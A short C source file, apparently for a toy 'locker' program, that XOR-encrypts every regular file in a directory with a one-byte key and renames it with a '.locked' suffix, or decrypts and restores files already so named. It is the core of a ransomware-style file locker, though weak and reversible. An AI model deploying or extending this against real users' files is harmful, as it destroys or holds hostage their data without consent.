#include "locker.h"
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

void processDirectory(const char* basePath, char key) {
    char fullPath[1024];
    char newFullPath[1024];

    DIR* directory = opendir(basePath);
    struct dirent* entry;

    if (directory == NULL) {
        printf("Error Opening Directory: %s\n", basePath);
        return;
    }

    while ((entry = readdir(directory)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullPath, sizeof(fullPath), "%s/%s", basePath, entry->d_name);

        struct stat pathStat;
        if (stat(fullPath, &pathStat) == 0 && S_ISREG(pathStat.st_mode)) {

            if (strstr(entry->d_name, ".locked")) {
                // 🔓 DECRYPT
                size_t len = strlen(entry->d_name);
                char originalName[1024];
                strncpy(originalName, entry->d_name, len - 7);
                originalName[len - 7] = '\0';

                snprintf(newFullPath, sizeof(newFullPath), "%s/%s", basePath, originalName);

                cryptFile(fullPath, key);
                if (rename(fullPath, newFullPath) == 0) {
                    printf("Decrypted & Renamed: %s → %s\n", fullPath, newFullPath);
                } else {
                    printf("Rename Failed: %s\n", fullPath);
                }

            } else {
                // 🔒 ENCRYPT
                snprintf(newFullPath, sizeof(newFullPath), "%s/%s.locked", basePath, entry->d_name);

                cryptFile(fullPath, key);
                if (rename(fullPath, newFullPath) == 0) {
                    printf("Encrypted & Renamed: %s → %s\n", fullPath, newFullPath);
                } else {
                    printf("Rename Failed: %s\n", fullPath);
                }
            }
        }
    }

    closedir(directory);
}

void cryptFile(const char* filePath, char key) {
    unsigned char buffer[1024];
    size_t bytesRead;

    FILE* file = fopen(filePath, "rb+");
    if (!file) {
        printf("Failed to open file: %s\n", filePath);
        return;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        for (size_t i = 0; i < bytesRead; i++) {
            buffer[i] ^= key;
        }

        fseek(file, -bytesRead, SEEK_CUR);
        fwrite(buffer, 1, bytesRead, file);
        fflush(file);
    }

    fclose(file);
}